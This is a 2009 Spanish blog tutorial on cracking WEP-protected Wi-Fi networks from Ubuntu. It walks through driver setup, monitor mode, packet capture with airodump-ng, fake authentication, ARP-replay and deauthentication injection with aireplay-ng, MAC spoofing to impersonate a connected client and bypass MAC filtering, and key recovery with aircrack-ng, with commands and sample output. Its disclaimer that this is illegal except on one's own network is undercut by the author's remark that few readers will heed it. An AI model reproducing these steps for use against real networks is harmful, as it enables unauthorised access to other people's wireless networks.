---
layout: post
status: publish
published: true
title: Crackear redes wifi con clave WEP desde Ubuntu linux
author:
  display_name: Booletaire
  login: elboletaire
  email: elboletaire@gmail.com
  url: http://www.underave.net
author_login: elboletaire
author_email: elboletaire@gmail.com
author_url: http://www.underave.net
excerpt: "
<ul>\r\n\t<li><a href=\"#intro\">Introducción</a></li>\r\n\t<li><a href=\"#pasos\">Primeros
  pasos (tarjetas compatibles) </a></li>\r\n\t<li><a href=\"#madwifi\">Instalar driver
  Madwifi</a>\r\n
<ul>\r\n\t<li><a href=\"#monitor\">Activar modo monitor</a></li>\r\n</ul>\r\n</li>\r\n\t<li><a
  href=\"#installaircrack\">Instalar aircrack-ng</a></li>\r\n\t<li><a href=\"#wep\">Crackeando
  redes WEP</a>\r\n
<ul>\r\n\t<li><a href=\"#monitor\">Activar modo monitor</a></li>\r\n\t<li><a
  href=\"#airodump\">Escanear redes y capturar paquetes</a></li>\r\n\t<li><a href=\"#macfilter\">Comprobar
  bloqueo MAC</a></li>\r\n\t<li><a href=\"#injection\">Inyección de paquetes (sin
  bloqueo MAC)</a></li>\r\n\t<li><a href=\"#macinjection\">Inyección de paquetes (con
  bloqueo MAC)</a></li>\r\n\t<li><a href=\"#macchange\">Cambiar dirección MAC de la
  interfaz de red</a></li>\r\n\t<li><a href=\"#authentication\">Autenticación en el
  router</a></li>\r\n\t<li><a href=\"#aircrack\">Averiguando la clave con aircrack-ng</a></li>\r\n</ul>\r\n</li>\r\n\t<li><a
  href=\"#descargas\">Descarga de ficheros</a></li>\r\n\t<li><a href=\"#referencias\">Páginas
  de referencia</a></li>\r\n</ul>\r\n<a name=\"intro\"></a>Hace poco me volví a interesar
  por este tema y me costó tanto lograrlo (lo hice posible entre 4 o 5 páginas distintas)
  que he decidido hacer una entrada reuniendo todos los pasos.  Antes de continuar
  debéis tener presente que esto es ilegal en la mayor parte de los países así que
  si vais a hacer uso de ello<strong> deberá ser sobre VUESTRA red WiFi</strong>.
  Dicho esto, que seguramente pocos haréis caso alguno, procedamos a ello.\r\n\r\n"
wordpress_id: 286
wordpress_url: http://racotecnic.underave.net/?p=286
date: '2009-03-19 19:40:51 +0100'
date_gmt: '2009-03-19 18:40:51 +0100'
categories:
- Linux
- Mac
tags:
- Wireless
- aircrack
- WEP
---

<ul>
<li><a href="#intro">Introducción</a></li>
<li><a href="#pasos">Primeros pasos (tarjetas compatibles) </a></li>
<li><a href="#madwifi">Instalar driver Madwifi</a>

<ul>
<li><a href="#monitor">Activar modo monitor</a></li>
</ul>
</li>
<li><a href="#installaircrack">Instalar aircrack-ng</a></li>
<li><a href="#wep">Crackeando redes WEP</a>

<ul>
<li><a href="#monitor">Activar modo monitor</a></li>
<li><a href="#airodump">Escanear redes y capturar paquetes</a></li>
<li><a href="#macfilter">Comprobar bloqueo MAC</a></li>
<li><a href="#injection">Inyección de paquetes (sin bloqueo MAC)</a></li>
<li><a href="#macinjection">Inyección de paquetes (con bloqueo MAC)</a></li>
<li><a href="#macchange">Cambiar dirección MAC de la interfaz de red</a></li>
<li><a href="#authentication">Autenticación en el router</a></li>
<li><a href="#aircrack">Averiguando la clave con aircrack-ng</a></li>
</ul>
</li>
<li><a href="#descargas">Descarga de ficheros</a></li>
<li><a href="#referencias">Páginas de referencia</a></li>
</ul>

<a name="intro"></a>Hace poco me volví a interesar por este tema y me costó tanto lograrlo (lo hice posible entre 4 o 5 páginas distintas) que he decidido hacer una entrada reuniendo todos los pasos.  Antes de continuar debéis tener presente que esto es ilegal en la mayor parte de los países así que si vais a hacer uso de ello<strong> deberá ser sobre VUESTRA red WiFi</strong>. Dicho esto, que seguramente pocos haréis caso alguno, procedamos a ello.

<a id="more"></a><a id="more-286"></a>
<h3><a name="pasos"></a>Primeros pasos</h3>

El primer paso será averiguar si nuestra tarjeta WiFi permite que la activemos en modo monitor. El modo monitor nos permite hacer un tipo de ataque que reduce considerablemente el tiempo de obtención de las claves (de unos días a unos minutos). No obstante, con cualquier tarjeta podéis obtener claves, el problema es que con una tarjeta sin modo monitor tardaréis días o semanas (o quizás nunca la consigáis).  En <a title="Ver listado de tarjetas en elhacker.net" href="http://hwagm.elhacker.net/htm/tarjetas.htm" target="_blank">este enlace</a> hay un buen listado de tarjetas inalámbricas dónde se nos indica cuáles están preparadas para hacer inyección (modo monitor) y cuáles no. Si vuestra tarjeta está en esta lista y en la celda de "Inyección" pone "Lx", ¡premio! Vuestra tarjeta permite la inyección de tráfico. Yo realizaré las pruebas con una D-link DWL con chipset Atheros (cuesta unos 25€ en cualquier tienda de informática).  Ahora que sabemos que nuestra tarjeta es compatible debemos instalar los drivers "Madwifi" para dicha tarjeta, ya que son los que nos permiten la inyección de tráfico y el uso de la aplicación aircrack-ng (la utilizada para averiguar las claves wifi).  Antes de poder instalar estos drivers necesitáis las herramientas de compilación y las cabeceras necesarias de linux (sin ello la instalación no se completaría). Así que accedemos a una terminal como administrador (tecleando "su" en ella) e instalamos las herramientas mencionadas:

aptitude install build-essential linux-headers-$(uname -r)
<h3><a name="madwifi"></a>Instalar driver Madwifi</h3>

Una vez instaladas las cabeceras procedemos a la instalación de Madwifi. Para ello descarguemos la última versión de la web <a title="Ir a la página del proyecto Madwifi" href="http://www.madwifi-project.org" target="_blank">madwifi-project</a>, actualmente la última versión (y la que estoy utilizando yo) es la siguiente:  <a title="Descargar drivers madwifi" href="http://snapshots.madwifi-project.org/madwifi-hal-0.10.5.6/madwifi-hal-0.10.5.6-r3942-20090205.tar.gz">madwifi-hal-0.10.5.6-r3942-20090205.tar.gz</a> Descargad el fichero en la carpeta /tmp/ (por ejemplo) y acceded a ella mediante consola para descomprimir e instalar el fichero:

<span style="color: #999999;">#ACCEDEMOS A LA CARPETA DONDE HEMOS DESCARGADO MADWIFI</span>
cd /tmp/
<span style="color: #999999;">#DESCOMPRIMIMOS MADWIFI</span>
tar -xvvzf madwifi-hal-0.10.5.6-r3942-20090205.tar.gz
<span style="color: #999999;">#ACCEDEMOS A LA CARPETA GENERADA</span>
cd madwifi-hal-0.10.5.6-r3942-20090205
<span style="color: #999999;">#COMPILAMOS E INSTALAMOS</span>
make &amp;&amp; make install

Si estáis reinstalando el driver recordad eliminar el anterior antes de hacer "make &amp;&amp; make install":

rmmod -w ath_pci.ko

Ahora que ya lo tenemos instalado debemos añadir el módulo al kernel de linux:

modprobe ath_pci

Y para añadirlo siempre que arranque el sistema, lo añadimos en el fichero modules situado en la carpeta etc:

echo ath_pci >> /etc/modules

Éste último comando escribe "ath_pci" al final del fichero modules. Si ya habíais instalado anteriormente Madwifi seguramente no sea necesario este paso (comprobad el contenido del fichero con "cat /etc/modules").
<h3><a name="installaircrack"></a>Instalar aircrack-ng</h3>

¡Ya tenemos instalado Madwifi! Lo siguiente que haremos será instalar aircrack-ng:

aptitude -y install aircrack-ng

Menuda complicación, ¿eh? :D
<h3><a name="wep"></a>Crackeando redes WEP</h3>

Antes de continuar a delante quiero recordaros lo que ya he dicho al principio...  <strong>La mayoría de países no permiten hacer esto, así que si vais a hacerlo debe ser con consentimiento del dueño de la red que vayáis a atacar.</strong>
<h4><a name="monitor"></a>Activar modo monitor</h4>

Ahora que ya tenemos todo lo necesario activaremos el modo monitor de nuestra tarjeta para poder hacer inyección de paquetes.  Recordad que el último paso que hicimos fue añadir el módulo de la tarjeta al kernel de linux pero no hemos activado nuestra red. Comprobemos las redes que tenemos activas con "ifconfig". Al hacerlo observaremos que tenemos una red "wifi0" pero esto es un dispositivo virtual y no nos sirve, así que pondremos en marcha el dispositivo ath0:

wlanconfig ath0 create wlandev wifi0 wlanmode sta

Si al hacerlo recibís el siguiente error:

wlanconfig: ioctl: Invalid argument

Es porque ya tenéis la red ath0 activada, pero para hacerla funcionar correctamente (solo para asegurarnos) haced lo siguiente:

<span style="color: #888888;">#LO DESTRUIMOS</span>
wlanconfig ath0 destroy
<span style="color: #888888;">#Y LO VOLVEMOS A CREAR EN MODO STANDALONE (wlanmode sta)</span>
wlanconfig ath0 create wlandev wifi0 wlanmode sta

Sé que parece algo estúpido, pero sin hacer esto probablemente no funcionaría correctamente (la primera vez, dado que hemos instalado los nuevos drivers sin destruir la conexión previamente).  Bien, ahora deberíais tener vuestra red wifi funcionando con normalidad y debéis poder conectaros a una red si disponéis de la contraseña.  Pasemos pues a activar el modo monitor de una vez:

<span style="color: #888888;">#LO DESTRUIMOS</span>
wlanconfig ath0 destroy
<span style="color: #888888;">#Y LO VOLVEMOS A CREAR EN MODO STANDALONE (wlanmode sta)</span>
wlanconfig ath0 create wlandev wifi0 wlanmode monitor

Ya la tenemos en modo monitor. Ahora aparentemente no funciona el wifi ya que si vamos a explorar redes con el applet de gnome no encuentra nada. Pero si no habéis recibido error alguno es porque está activado y podéis pasar al siguiente paso.
<h4><a name="airodump"></a>Escanear redes y capturar paquetes</h4>

Primero haremos un escaneo sin especificar canal ni nada, simplemente para ver en qué canal se encuentra nuestra red:

airodump-ng ath0

La pantalla está dividida en dos partes importantes: la de AP (access points), en la parte superior y la de clientes, en la parte inferior.

<figure>
  <a rel="lightbox" href="{{ site.url }}/uploads/2009/03/airodump-ng.png" target="_blank"><img title="airodump-ng_thumb" src="{{ site.url }}/uploads/2009/03/airodump-ng_thumb.png" alt="airodump-ng_thumb" width="379" height="68" /></a>
  <figcaption>
    airodump-ng (clic para ampliar)
  </figcaption>
</figure>

Las cosas que más nos interesan son BSSID (MAC del AP), PWR (potencia de la señal), #Data que nos dice el número de paquetes captados (paquetes que luego servirán para averiguar la contraseña, cuantos más paquetes más posibilidades de conseguirla), CH (canal), ENC (tipo de encriptación que para seguir este tutorial debe ser WEP), ESSID (nombre de la red), STATION (usuarios conectados al AP).  Mi red es la que tiene como nombre "JAZZTEL_2C" con BSSID 00:1A:23:14:23:3C y, evidentemente, esta es la que voy a atacar, así que empecemos capturando paquetes sólo para esta red (lo que reducirá el tamaño del fichero generado):

airodump-ng --channel <strong>11</strong> --bssid <strong>00:1A:23:14:23:3C</strong> --write jazztel2c ath0

En negrita están el canal y la BSSID respectivamente, que deberéis cambiar a partir de los datos obtenidos vosotros de vuestra red.  El parámetro --write indica dónde el nombre del fichero en el que se guardarán los datos y "ath0" es nuestra interfaz de red.
<h4><a name="macfilter"></a>Comprobar bloqueo MAC</h4>

El siguiente paso será comprobar si el punto de acceso tiene activada la restricción MAC, para hacerlo utilizaremos aireplay-ng (en una nueva terminal, por supuesto):

aireplay-ng -1 0 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:11:22:33:44:55 ath0

El primer parámetro es el tipo de ataque (un número del 0 al 6), en este caso un uno, seguido del número de veces que se va a hacer (0 es la primera posición, así que se repetirá una única vez). El parámetro -e es el nombre de la red, la -a su BSSID y la -h es una MAC inventada (ahí la gracia, saber si nos permite conectarnos con una mac que no exista en su lista negra) y el último parámetro es la interfaz de red que utilizaremos. Si el resultado es...

16:35:29  Sending Authentication Request (Open System) [ACK]
16:35:29  Authentication successful
16:35:29  Sending Association Request [ACK]
16:35:29  Association successful :-) (AID: 1)

El filtro MAC está inhabilitado y podéis pasar al paso "Inyección de paquetes (sin bloqueo mac)", sino saltad a "Inyección de paquetes (con bloqueo mac)".
<h4><a name="injection"></a>Inyección de paquetes (sin bloqueo mac)</h4>

Vayamos al terminal donde tenemos airodump-ng funcionando (captando paquetes) y comprobemos si hay algún STATION asociado al BSSID de la red a atacar. Si es así copiad la MAC de la estación y utilizadla en la siguiente orden:

aireplay-ng -3 -b 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0

-3 es el tipo de ataque, -b la bssid a atacar, -h la MAC de la STATION y el último parámetro es la interfaz de red. En caso de no disponer de un STATION debéis poner vuestra MAC, para averiguarla podéis mirarlo en vuestra tarjeta de red o bien con el comando:

ifconfig ath0 | grep HWaddr

Si os da vuestra dirección separada por guiones recordad ponerla separada por puntos y sólo las 6 primeras parejas de números.  Hecho esto veréis como aireplay-ng empieza a enviar paquetes al AP. Puede que pasen unos minutos hasta que los "ARP" empiezan a incrementar, pero llegado ese momento podréis ver como los "#Data" de airodump-ng empiezan a subir rápidamente.

<figure>
  <a rel="lightbox" href="{{ site.url }}/uploads/2009/03/aireplay-ng.png"><img class="size-full wp-image-327" title="aireplay-ng" src="{{ site.url }}/uploads/2009/03/aireplay-ng.png" alt="aireplay-ng" width="461" height="60" /></a>
  <figcaption>
    Inyección de tráfico con aireplay-ng
  </figcaption>
</figure>

Si estamos atacando utilizando la mac de un STATION en lugar de la nuestra, nos aparecerá este error:

The interface MAC (06:19:5B:C9:F2:4A) doesn't match the specified MAC (-h).
	ifconfig ath0 hw ether 00:16:CB:BA:23:D2

Esto es porque la mac que le hemos indicado no coincide con la de nuestra tarjeta de red. Para solucionar esto basta con cambiar la mac por la de la estación que estemos emulando (utilizad control+C para terminar el proceso de aireplay-ng, cambiad la MAC y volved a ejecutar aireplay-ng). Para cambiar la MAC pasad al punto <a href="#macchange">Cambiar dirección MAC de la interfaz de red</a>

.
<h4><a name="macinjection"></a>Inyección de paquetes (con bloqueo MAC)</h4>

La opción más sencilla a la hora de inyectar paquetes en un AP con bloqueo MAC es hacerse pasar por uno de sus clientes. Para poder hacer esto tenemos que cambiar la dirección MAC, no obstante aireplay-ng tiene la posibilidad de atacar AP con bloqueo MAC (con este proceso no es necesario cambiar la MAC):

aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:11:22:33:44:55
aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:11:22:33:44:55

Es un proceso bastante más lento que sin bloqueo de MAC, pero funciona igualmente. De todos modos si hay alguna estación conectada al AP la mejor opción es que cambiéis vuestra MAC a la de dicha estación.
<h4><a name="macchange"></a>Cambiar dirección MAC de la interfaz de red</h4>

Para ello hay dos maneras de hacerlo, una de ellas nos la indicaba un error de unas líneas más arriba:

ifconfig ath0 hw ether 00:16:CB:BA:23:D2

La otra es utilizar macchanger:

<span style="color: #888888;">#INSTALAMOS MACCHANGER</span>
aptitude -y install macchanger
<span style="color: #888888;">#DESACTIVAMOS LA INTERFAZ DE RED ath0</span>
ifconfig ath0 down
<span style="color: #888888;">#CAMBIAMOS LA MAC</span>
macchanger -m 00:16:CB:BA:23:D2
<span style="color: #888888;">#REACTIVAMOS LA INTERFAZ DE RED ath0</span>
ifconfig ath0 up

Haciendo esto nos aseguramos que el AP crea que somos uno de sus clientes y facilitará la obtención de paquetes ARP.

<figure>
  <a rel="lightbox" href="{{ site.url }}/uploads/2009/03/aireplay-ng_sending.png"><img class="size-full wp-image-332" title="aireplay-ng_sending" src="{{ site.url }}/uploads/2009/03/aireplay-ng_sending.png" alt="aireplay-ng enviando paquetes" width="561" height="60" /></a>
  <figcaption>
    aireplay-ng enviando paquetes
  </figcaption>
</figure>
<h4><a name="authentication"></a>Autenticación en el router</h4>

En ocasiones puede que se nos presente el siguiente error al ejecutar la inyección de tráfico con aireplay-ng:

Notice: got a deauth/disassoc packet. Is the source MAC associated ?

Esto es debido a que no nos hemos identificado en el router y se da casi siempre que no hay una estación conectada al AP. Podemos solucionarlo de dos formas:

aireplay-ng -1 0 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0

Que de ser ejecutado correctamente nos mostrará en pantalla:

18:18:20  Sending Authentication Request
18:18:20  Authentication successful
18:18:20  Sending Association Request
18:18:20  Association successful :-)

El otro método es el que sigue:

aireplay-ng -1 6000 -o 1 -q 10 -e JAZZTEL_2C -a 00:1A:23:14:23:3C -h 00:16:CB:BA:23:D2 ath0

Aquí estamos indicando que envíe paquetes cada 6 segundos (en milisegundos) y que sólo los envíe en grupos de uno (-o 1) ya que muchos AP se confunden al mandarles muchos paquetes juntos (que es como actúa por defecto).

18:19:20  Sending Authentication Request (Open System) [ACK]
18:19:20  Authentication successful
18:19:20  Sending Association Request [ACK]
18:19:20  Association successful :-) (AID: 1)
18:19:42  Sending keep-alive packet [ACK]
18:19:55  Sending keep-alive packet [ACK]

Ambas son igualmente eficientes (quizás la primera sea un poco más rápida, pero habrá muchas ocasiones en que no podréis utilizarla). Os recomiendo la segunda, ya que no paramos de autenticarnos en el router y no le damos pie a errores.
<h4><a name="aircrack"></a>Averiguando la clave con aircrack-ng</h4>

Cuando el número de #Data esté por encima de 30.000 podemos ir ejecutando aircrack-ng en una nueva terminal cargando el fichero que se va guardando (es decir, no paréis la captura de paquetes con airodump, por si no tuviérais suficientes datos):

aircrack-ng jazztel2c-01.cap

Y.. presto! Ya tenemos nuestra clave:

<figure>
  <a title="aircrack-ng (ampliar)" rel="lightbox" href="{{ site.url }}/uploads/2009/03/aircrack-ng.png" target="_blank"><img class="size-full wp-image-338" title="aircrack-ng_thumb" src="{{ site.url }}/uploads/2009/03/aircrack-ng_thumb.png" alt="aircrack-ng_thumb" width="286" height="33" /></a>
  <figcaption>
    Contraseña desencriptada (clic para ampliar)
  </figcaption>
</figure>
<h3><a name="descargas"></a>Descarga de ficheros</h3>

En caso de que no pudierais utilizar "aptitude" porque la máquina desde la cual queréis hacer los ataques no tiene conexión a internet podéis descargar todos los programas que he ido mencionando desde la página de paquetes de ubuntu:
<blockquote>

<ul>
<li><a title="Descargar build-essential" href="http://packages.ubuntu.com/intrepid/build-essential" target="_blank">build-essential</a></li>
<li><a title="Descargar linux-headers-*" href="http://packages.ubuntu.com/search?searchon=names&amp;keywords=linux-headers" target="_blank">linux-headers</a></li>
<li><a title="Descargar aircrack-ng" href="http://packages.ubuntu.com/intrepid/aircrack-ng" target="_blank">aircrack-ng</a></li>
</ul>
</blockquote>

En el caso de los linux-headers debéis descargar la versión correspondiente a vuestra versión de kernel. Para averiguarla podéis hacerlo con "uname":

uname -r

Recordad destruir la interfaz y reactivarla en modo standalone una vez tengáis la contraseña para poderos conectar normalmente al AP.
<h3><a name="referencias"></a>Páginas de referencia</h3>
<blockquote>

<ul>
<li><a title="Ver original" href="http://ubuntuforums.org/showthread.php?t=528276" target="_blank">HOWTO: Aircrack-NG</a></li>
<li><a title="Ver original" href="http://forums.remote-exploit.org/showthread.php?t=330" target="_blank">Howto get Madwifi-ng drivers to work properly!</a></li>
<li><a title="Ir a google" href="http://www.google.es" target="_blank">Ooh todopoderoso Google</a></li>
</ul>
</blockquote>

Espero haberme explicado con suficiente claridad. Me he pasado mucho tiempo intentando organizarlo de la mejor manera posible. Ahora sólo os queda practicar! Con unas cuántas pruebas le pillaréis el tranquillo ;)
